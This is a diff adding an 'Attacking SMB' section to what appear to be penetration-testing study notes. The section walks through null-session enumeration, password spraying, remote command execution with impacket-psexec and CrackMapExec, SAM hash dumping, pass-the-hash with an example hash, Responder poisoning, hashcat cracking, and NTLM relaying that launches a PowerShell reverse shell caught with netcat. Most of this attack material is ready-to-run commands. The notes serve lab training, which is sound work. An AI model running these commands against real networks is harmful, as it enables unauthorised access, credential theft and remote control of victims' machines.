@@ -366,3 +366,198 @@ Many different attacks and methods are protocol-based. However, it is essential 
 - FTP can be vulnerable if misconfigured or exploited through brute-force, anonymous login, or FTP bounce attacks. Understanding how to interact with the FTP service and identifying misconfigurations can lead to successful exploitation.
 
 # Attacking SMB
+Server Message Block (SMB) is a protocol for network file and printer sharing, initially running on NetBIOS over TCP/IP but now able to run directly on TCP/IP using port 445. Samba is the open-source implementation of SMB for Unix/Linux systems, allowing interoperability with Windows clients. To attack an SMB server, one must understand its implementation and configuration, exploit known vulnerabilities, and be cautious of the content in shared directories, including how NetBIOS and RPC might be leveraged.
+
+## Enumeration
+```
+sudo nmap 10.129.14.128 -sV -sC -p139,445
+```
+The Nmap scan reveals essential information about the target:
+
+SMB version (Samba smbd 4.6.2)
+Hostname HTB
+Operating System is Linux based on SMB implementation
+
+## Misconfigurations
+SMB can be configured not to require authentication, which is often called a null session. Instead, we can log in to a system with no username or password.
+### Anonymous Authentication
+If we find an SMB server that does not require a username and password or find valid credentials, we can get a list of shares, usernames, groups, permissions, policies, services, etc.
+### File Share 
+```
+smbclient -N -L //10.129.14.128
+```
+Smbmap is another tool that helps us enumerate network shares and access associated permissions. An advantage of smbmap is that it provides a list of permissions for each shared folder.
+```
+smbmap -H 10.129.14.128
+```
+Using smbmap with the -r or -R (recursive) option, one can browse the directories:
+```
+smbmap -H 10.129.14.128 -r notes
+```
+the permissions are set to READ and WRITE, which one can use to upload and download the files.
+```
+smbmap -H 10.129.14.128 --download "notes\note.txt"
+```
+Upload
+```
+smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"
+```
+### Remote Procedure Call (RPC)
+
+The rpcclient tool offers us many different commands to execute specific functions on the SMB server to gather information or modify server attributes like a username. 
+
+```
+rpcclient -U'%' 10.10.110.17
+```
+```
+enumdomusers
+```
+Enum4linux is another utility that supports null sessions, and it utilizes nmblookup, net, rpcclient, and smbclient to automate some common enumeration from SMB targets such as:
+Workgroup/Domain name, Users information, Operating system information, Groups information, Shares Folders, Password policy information.
+
+```
+./enum4linux-ng.py 10.10.11.45 -A -C
+```
+## Protocol Specifics Attacks
+If no null session try the bellow methods
+### Brute Forcing and Password Spray
+When brute-forcing, we try as many passwords as possible against an account, but it can lock out an account if we hit the threshold. 
+
+Password spraying is a better alternative since we can target a list of usernames with one common password to avoid account lockouts. We can try more than one password if we know the account lockout threshold. Typically, two to three attempts are safe, provided we wait 30-60 minutes between attempts.
+
+```
+cat /tmp/userlist.txt
+```
+```
+Administrator
+jrodriguez 
+admin
+<SNIP>
+jurena
+```
+
+**Use NetExec for password spraying**
+```
+netexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!' --local-auth
+```
+Additionally, if we are targetting a non-domain joined computer, we will need to use the option --local-auth. 
+
+### SMB 
+#### Linux SMB Servers:
+- **Access**: Typically limited to file system access, privilege abuse, or known vulnerability exploitation.
+  
+#### Windows SMB Servers:
+- **Attack Surface**: Larger than Linux.
+- **Actions Based on User Privileges**:
+  - Remote Command Execution (RCE)
+  - Extracting Hashes from the SAM Database
+  - Enumerating Logged-on Users
+  - Pass-the-Hash (PTH) attacks
+
+#### Remote Code Execution (RCE) with PsExec:
+- **Sysinternals**: Developed for managing and troubleshooting Windows environments; includes PsExec.
+- **PsExec**: Enables remote command execution by deploying a service to the admin$ share, utilizing the DCE/RPC interface over SMB.
+
+#### PsExec Implementations:
+- **Impacket PsExec**: Python-based, using RemComSvc.
+- **Impacket SMBExec**: Avoids RemComSvc, uses a local SMB server.
+- **Impacket atexec**: Uses Task Scheduler for command execution.
+- **CrackMapExec**: Includes smbexec and atexec.
+- **Metasploit PsExec**: Ruby-based implementation.
+
+#### Impacket PsExec
+Requires domain/username, password, and target IP address.
+
+```
+impacket-psexec -h
+```
+To connect to a remote machine with a local administrator account, using impacket-psexec
+```
+impacket-psexec administrator:'Password123!'@10.10.110.17
+```
+#### CrackMapExec
+Another tool we can use to run CMD or PowerShell is CrackMapExec. One advantage of CrackMapExec is the availability to run a command on multiples host at a time. To use it, we need to specify the protocol, smb, the IP address or IP address range, the option -u for username, and -p for the password, and the option -x to run cmd commands or uppercase -X to run PowerShell commands.
+
+```
+crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec
+```
+#### Enumerating Logged-on Users
+CrackMapExec to enumerate logged-on users on all machines within the same network 10.10.110.17/24, which speeds up our enumeration process.
+```
+crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users
+```
+#### Extract Hashes from SAM Database
+The Security Account Manager (SAM) is a database file that stores users' passwords. It can be used to authenticate local and remote users. If we get administrative privileges on a machine, we can extract the SAM database hashes for different purposes:
+
+Authenticate as another user.
+Password Cracking, if we manage to crack the password, we can try to reuse the password for other services or accounts.
+Pass The Hash.
+```
+crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam
+```
+
+#### Pass-the-Hash (PtH)
+If we manage to get an NTLM hash of a user, and if we cannot crack it, we can still use the hash to authenticate over SMB with a technique called Pass-the-Hash (PtH). 
+```
+crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE
+```
+### Forced Authentication Attacks
+
+#### Using Fake SMB Server:
+- **Purpose**: Capture users' NetNTLM v1/v2 hashes by creating a fake SMB server.
+- **Common Tool**: Responder, an LLMNR, NBT-NS, and MDNS poisoner tool.
+
+#### Responder Functionality:
+- **Setup Command**:
+  ```
+  responder -I <interface name>
+  ```
+- **Default Behavior**: Finds LLMNR and NBT-NS traffic, responds on behalf of the servers the victim is looking for, and captures their NetNTLM hashes.
+
+#### Example Scenario:
+1. **Name Resolution Process**:
+   - Check local host file.
+   - Check local DNS cache.
+   - Query DNS server.
+   - Multicast query if no results.
+2. **Attack Scenario**:
+   - A user mistypes a shared folder name.
+   - All name resolutions fail, leading to a multicast query.
+   - The attacker's fake SMB server responds to this query, capturing the user's credentials.
+
+#### Setup Example:
+- **Command**:
+  ```
+  sudo responder -I ens33
+  ```
+These captured credentials can be cracked using hashcat or relayed to a remote host to complete the authentication and impersonate the user.
+
+All saved Hashes are located in Responder's logs directory (/usr/share/responder/logs/). 
+
+```
+hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
+```
+The NTLMv2 hash was cracked. The password is P@ssword. If we cannot crack the hash, we can potentially relay the captured hash to another machine using impacket-ntlmrelayx or Responder MultiRelay.py. 
+
+First, we need to set SMB to OFF in our responder configuration file (/etc/responder/Responder.conf).
+
+```
+ cat /etc/responder/Responder.conf | grep 'SMB ='
+```
+Then we execute impacket-ntlmrelayx with the option --no-http-server, -smb2support, and the target machine with the option -t. By default, impacket-ntlmrelayx will dump the SAM database, but we can execute commands by adding the option -c.
+```
+impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146
+```
+We can create a PowerShell reverse shell using https://www.revshells.com/, set our machine IP address, port, and the option Powershell #3 (Base64).
+```
+impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'revshell command from revshells.com'
+```
+Once the victim authenticates to our server, we poison the response and make it execute our command to obtain a reverse shell.
+
+```
+ nc -lvnp 9001
+```
+### RPC
+use RPC to make changes to the system, such as:
+
+Change a user's password, Create a new domain user, Create a new shared folder.
